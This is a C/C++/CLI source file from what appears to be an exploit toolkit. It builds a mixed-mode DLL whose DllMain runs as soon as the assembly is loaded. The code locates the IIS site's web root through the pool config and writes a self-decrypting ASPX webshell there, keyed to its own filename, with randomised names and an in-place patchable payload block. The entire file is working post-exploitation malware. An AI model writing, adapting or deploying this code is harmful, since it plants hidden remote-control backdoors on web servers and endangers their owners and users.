// payload_write.c — IJW mixed-mode C++/CLI DLL: web root shell-drop variant.
//
// Compiled with /clr — the result is simultaneously a valid .NET assembly
// (Assembly.LoadFrom accepts it) and a native PE with a real DllMain entry
// point. The Windows loader calls DllMain(DLL_PROCESS_ATTACH) before any
// managed method runs, so our code executes the moment the assembly is loaded.
//
// C++/CLI DLLs loaded via Assembly.LoadFrom bypass _DllMainCRTStartup, which
// means the CRT is not initialised. Every string operation uses Win32 kernel32
// exports and raw pointer arithmetic — no wcsstr, strlen, or <string.h>.
// The code calls only kernel32, but the compiled /clr image still imports
// vcruntime140.dll and mscoree.dll, as every IJW mixed-mode assembly does, so
// the Visual C++ runtime has to be present on the target.
//
// Web-root discovery (all Win32, no hardcoded paths):
//   1. GetCommandLineW()         — extract the per-pool config path from -h "ConfigPath"
//   2. CreateFileW + ReadFile    — read the per-pool config file at that path
//   3. Byte scan                 — find physicalPath="..." in the per-pool config
//   4. ExpandEnvironmentStringsA — expand any %SystemDrive% or similar variables
//   5. CreateFileW + WriteFile   — write the shell to the resolved web root
//
// Patchable config block (native .data section):
//   Magic "TSECPLD\0" at g_cfg[0..7] — used by the exploit tool to locate
//   the block in the uploaded binary without recompiling.
//
//   g_cfg[8]       debug flag  — 0 = off (default, no file I/O at all),
//                                non-zero = on (writes log entries to log path)
//   g_cfg[16..47]  shell filename — null-terminated, 32-byte field, max 31 ASCII
//                                chars. Default: "shell.aspx".
//   g_cfg[48..111] log path    — null-terminated, 64-byte field, max 63 ASCII
//                                chars. Only written when debug flag is on.
//                                Default: "C:\Windows\Temp\dbg.txt".
//
//   Exploit tool flags (applied in-memory before upload; no recompile needed):
//     -debug-shell               set debug flag to 1
//     -shell-name <filename>     override shell filename (1-31 ASCII chars,
//                                no path separators; validated before upload)
//     -shell-logpath <path>      override log path (1-63 ASCII chars)
//
//   When -shell-mode write is used without -shell-name, the exploit tool
//   auto-generates "<random>.aspx" using the same random substring it uses to
//   rename the assembly, so every upload uses a different shell filename.
//   The generated name is persisted in the state file for resume.
//
// Patchable webshell stub block (native .data section):
//   Magic "TSWSHLL\0" at g_wshell[0..7].
//
//   The exploit XOR-encrypts the compiled webshell.dll bytes with the shell
//   filename (g_cfg+16), writes the length as LE uint32 at g_wshell[8..11],
//   and writes the encrypted bytes at g_wshell[12..]. DllMain reads those
//   bytes, formats them as a C# byte-array literal, and embeds them in the
//   self-decrypting ASPX template it writes to the web root.
//
//   The ASPX uses Path.GetFileName(Request.PhysicalPath) as the XOR key,
//   which matches the shell filename used to encrypt — so the file decrypts
//   itself using its own name. Assembly.Load(byte[]) then loads the stub.
//   Class W, method R(HttpRequest, HttpResponse) is the entry point.
#include <windows.h>

#pragma unmanaged

// Patchable config block. The exploit tool locates this block by its magic
// prefix and patches it in memory before upload — no recompile needed.
static volatile unsigned char g_cfg[128] = {
    /* [0..7]   magic "TSECPLD\0" */
    'T','S','E','C','P','L','D',0,
    /* [8]      debug flag: 0 = off, non-zero = on */
    0,
    /* [9..15]  reserved */
    0,0,0,0,0,0,0,
    /* [16..47] shell filename, null-terminated, 32 bytes */
    's','h','e','l','l','.','a','s','p','x',0,
    0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
    /* [48..111] log path, null-terminated, 64 bytes */
    'C',':','\\','W','i','n','d','o','w','s','\\','T','e','m','p','\\','d','b','g','.','t','x','t',0,
    0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
    0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
    0,0,0,0,0,0,0,0,
    /* [112..127] reserved */
    0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
};

static int         DbgEnabled()  { return g_cfg[8]; }
static const char* ShellName()   { return (const char*)(g_cfg + 16); }
static const char* LogPath()     { return (const char*)(g_cfg + 48); }

// Patchable webshell stub block. Exploit locates this by "TSWSHLL\0", writes
// the XOR-encrypted webshell.dll length at [8..11] (LE uint32) and the
// encrypted bytes at [12..]. Capacity: 8192 bytes.
#define WSHELL_CAPACITY 8192

// g_wshell lives in its own writable section (.tsblob), separate from .rdata
// where the CLR header and .NET metadata reside. The whole 12 + WSHELL_CAPACITY
// range is contiguous and file-backed, so the exploit's in-place write at the
// "TSWSHLL\0" magic stays within this buffer and never touches the manifest.
#pragma section(".tsblob", read, write)

__declspec(allocate(".tsblob"))
static volatile unsigned char g_wshell[12 + WSHELL_CAPACITY] = {
    /* [0..7]  magic "TSWSHLL\0" */
    'T','S','W','S','H','L','L',0,
    /* [8..11] content length (LE uint32), patched by exploit */
    0,0,0,0,
    /* [12..] zero placeholder, patched by exploit with XOR-encrypted webshell bytes */
};

// Non-zero trailing object in .tsblob: extends the section's raw data past
// g_wshell so the buffer's zero tail keeps file backing. Not read at runtime.
__declspec(allocate(".tsblob"))
static volatile unsigned char g_wshell_guard[16] = {
    0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,
    0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC
};

// ASPX decryptor template — prefix and suffix sandwich the encrypted byte literal.
// The ASPX uses Path.GetFileName(Request.PhysicalPath) as the XOR key, then
// loads the decrypted assembly and invokes W.R(HttpRequest, HttpResponse).
static const char ASPX_PREFIX[] =
    "<%@ Page Language=\"C#\" %>\r\n"
    "<script runat=\"server\">\r\n"
    "static readonly byte[] _e=new byte[]{";

static const char ASPX_SUFFIX[] =
    "};\r\n"
    "void Page_Load(object s,System.EventArgs a){\r\n"
    "  string k=System.IO.Path.GetFileName(Request.PhysicalPath);\r\n"
    "  byte[] d=(byte[])_e.Clone();\r\n"
    "  for(int i=0;i<d.Length;i++)d[i]^=(byte)k[i%k.Length];\r\n"
    "  var m=System.Reflection.Assembly.Load(d).GetType(\"W\").GetMethod(\"R\");\r\n"
    "  m.Invoke(null,new object[]{Request,Response});\r\n"
    "}\r\n"
    "</script>";

// ---- CRT-free string helpers -----------------------------------------------

static wchar_t* w_find(const wchar_t* h, const wchar_t* n) {
    int nlen = lstrlenW(n);
    if (!nlen) return (wchar_t*)h;
    for (; *h; h++) {
        int i = 0;
        while (i < nlen && h[i] == n[i]) i++;
        if (i == nlen) return (wchar_t*)h;
    }
    return NULL;
}

static wchar_t* w_findch(const wchar_t* s, wchar_t c) {
    for (; *s; s++) if (*s == c) return (wchar_t*)s;
    return NULL;
}

static char* a_find(const char* h, const char* n) {
    int nlen = lstrlenA(n);
    if (!nlen) return (char*)h;
    for (; *h; h++) {
        int i = 0;
        while (i < nlen && h[i] == n[i]) i++;
        if (i == nlen) return (char*)h;
    }
    return NULL;
}

static char* a_findch(const char* s, char c) {
    for (; *s; s++) if (*s == c) return (char*)s;
    return NULL;
}

// ---- Diagnostics -----------------------------------------------------------

static void DiagA(const char* msg) {
    if (!DbgEnabled()) return;
    HANDLE h = CreateFileA(LogPath(),
        GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
        OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    SetFilePointer(h, 0, NULL, FILE_END);
    DWORD w;
    WriteFile(h, msg, (DWORD)lstrlenA(msg), &w, NULL);
    WriteFile(h, "\r\n", 2, &w, NULL);
    CloseHandle(h);
}

// ---- Path discovery --------------------------------------------------------

static int getConfigPath(wchar_t* out, int maxLen) {
    wchar_t* cmd = GetCommandLineW();
    if (!cmd) return 0;
    wchar_t* p = w_find(cmd, L" -h \"");
    if (!p) return 0;
    p += 5;
    wchar_t* end = w_findch(p, L'"');
    if (!end) return 0;
    int wlen = (int)(end - p);
    if (wlen <= 0 || wlen >= maxLen) return 0;
    int i;
    for (i = 0; i < wlen; i++) out[i] = p[i];
    out[wlen] = L'\0';
    return wlen;
}

static char* readIISConfig(DWORD* outSize) {
    wchar_t cfgPath[MAX_PATH];
    cfgPath[0] = L'\0';
    if (!getConfigPath(cfgPath, MAX_PATH) || !cfgPath[0]) return NULL;

    HANDLE hf = CreateFileW(cfgPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return NULL;

    DWORD size = GetFileSize(hf, NULL);
    if (size == INVALID_FILE_SIZE || size == 0 || size > 4 * 1024 * 1024) {
        CloseHandle(hf); return NULL;
    }

    char* buf = (char*)HeapAlloc(GetProcessHeap(), 0, size + 2);
    if (!buf) { CloseHandle(hf); return NULL; }

    DWORD bytesRead = 0;
    if (!ReadFile(hf, buf, size, &bytesRead, NULL)) {
        HeapFree(GetProcessHeap(), 0, buf);
        CloseHandle(hf);
        return NULL;
    }
    buf[bytesRead] = '\0';
    *outSize = bytesRead;
    CloseHandle(hf);
    return buf;
}

static BOOL findPhysicalPath(const char* cfg, char* out, int maxLen) {
    const char* pp = a_find(cfg, "physicalPath=\"");
    if (!pp) return FALSE;
    pp += 14;

    const char* eq = a_findch(pp, '"');
    if (!eq) return FALSE;

    int len = (int)(eq - pp);
    if (len <= 0 || len >= maxLen) return FALSE;

    int i;
    for (i = 0; i < len; i++) out[i] = pp[i];
    out[len] = '\0';
    return TRUE;
}

// ---- ASPX builder ----------------------------------------------------------

static const char HEX_CHARS[] = "0123456789ABCDEF";

// Formats one byte as "0xNN," (5 chars) into out. Returns 5.
static int fmtByte(char* out, unsigned char b) {
    out[0] = '0'; out[1] = 'x';
    out[2] = HEX_CHARS[(b >> 4) & 0xF];
    out[3] = HEX_CHARS[b & 0xF];
    out[4] = ',';
    return 5;
}

// Builds the self-decrypting ASPX into a HeapAlloc'd buffer.
// Caller must HeapFree the returned pointer. Returns NULL on failure.
static char* buildAspx(DWORD* outLen) {
    static const unsigned char wshellMagic[8] = {'T','S','W','S','H','L','L',0};
    int mi;
    for (mi = 0; mi < 8; mi++) {
        if (g_wshell[mi] != wshellMagic[mi]) {
            DiagA("buildAspx: bad wshell magic");
            return NULL;
        }
    }

    DWORD encLen = (DWORD)g_wshell[8]
                 | ((DWORD)g_wshell[9]  << 8)
                 | ((DWORD)g_wshell[10] << 16)
                 | ((DWORD)g_wshell[11] << 24);
    if (encLen == 0 || encLen > WSHELL_CAPACITY) {
        DiagA("buildAspx: wshell not loaded (run with -shell-dll)");
        return NULL;
    }

    const unsigned char* enc = (const unsigned char*)(g_wshell + 12);
    int prefixLen = lstrlenA(ASPX_PREFIX);
    int suffixLen = lstrlenA(ASPX_SUFFIX);
    // Each byte formats to 5 chars ("0xNN,"). C# allows a trailing comma in
    // array initialisers, so no special handling needed for the last byte.
    DWORD bufSize = (DWORD)prefixLen + encLen * 5 + (DWORD)suffixLen + 4;
    char* buf = (char*)HeapAlloc(GetProcessHeap(), 0, bufSize);
    if (!buf) { DiagA("buildAspx: HeapAlloc failed"); return NULL; }

    char* p = buf;
    int i;
    for (i = 0; i < prefixLen; i++) *p++ = ASPX_PREFIX[i];
    DWORD j;
    for (j = 0; j < encLen; j++) p += fmtByte(p, enc[j]);
    for (i = 0; i < suffixLen; i++) *p++ = ASPX_SUFFIX[i];

    *outLen = (DWORD)(p - buf);
    return buf;
}

// ---- Entry point -----------------------------------------------------------

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID lp) {
    if (reason == DLL_PROCESS_ATTACH) {
        DiagA("DllMain start");

        DWORD cfgSize = 0;
        char* cfg = readIISConfig(&cfgSize);
        if (!cfg) {
            DiagA("config read failed");
            return TRUE;
        }

        char webRoot[MAX_PATH];
        webRoot[0] = '\0';
        BOOL found = findPhysicalPath(cfg, webRoot, sizeof(webRoot));
        HeapFree(GetProcessHeap(), 0, cfg);

        if (!found || !webRoot[0]) {
            DiagA("physicalPath not found");
            return TRUE;
        }

        char expanded[MAX_PATH];
        expanded[0] = '\0';
        ExpandEnvironmentStringsA(webRoot, expanded, sizeof(expanded));
        if (expanded[0]) lstrcpyA(webRoot, expanded);
        DiagA(webRoot);

        int rootLen = lstrlenA(webRoot);
        if (rootLen > 0 && webRoot[rootLen - 1] != '\\') {
            webRoot[rootLen++] = '\\';
            webRoot[rootLen]   = '\0';
        }
        lstrcatA(webRoot, ShellName());

        wchar_t wPath[MAX_PATH];
        wPath[0] = L'\0';
        MultiByteToWideChar(CP_ACP, 0, webRoot, -1, wPath, MAX_PATH);

        HANDLE hf = CreateFileW(wPath, GENERIC_WRITE, 0, NULL,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf == INVALID_HANDLE_VALUE) {
            DiagA("CreateFileW failed");
            return TRUE;
        }

        DWORD aspxLen = 0;
        char* aspx = buildAspx(&aspxLen);
        if (!aspx) {
            DiagA("buildAspx failed");
            CloseHandle(hf);
            return TRUE;
        }

        DWORD written = 0;
        WriteFile(hf, aspx, aspxLen, &written, NULL);
        HeapFree(GetProcessHeap(), 0, aspx);
        CloseHandle(hf);
        DiagA("shell written OK");
    }
    return TRUE;
}

// The CLR requires at least one managed type in the assembly manifest.
// This empty class satisfies that requirement — it is never called.
#pragma managed
ref class ContentHelper : public System::Object {};
